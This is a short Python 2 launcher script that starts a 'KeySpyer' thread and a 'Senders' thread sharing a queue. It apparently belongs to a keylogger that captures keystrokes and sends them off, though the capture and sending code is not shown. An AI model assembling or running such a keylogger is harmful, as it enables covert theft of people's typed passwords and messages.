# coding:utf-8
import config
from KeySpy import  KeySpyer
from Sender import Senders
import Queue
import sys
reload(sys)
sys.setdefaultencoding("utf-8")


if __name__ == "__main__":
    q = Queue.Queue(config.MAX_QUEUE)

    spyer = KeySpyer(q)
    sender = Senders(q)
    spyer.start()
    sender.start()
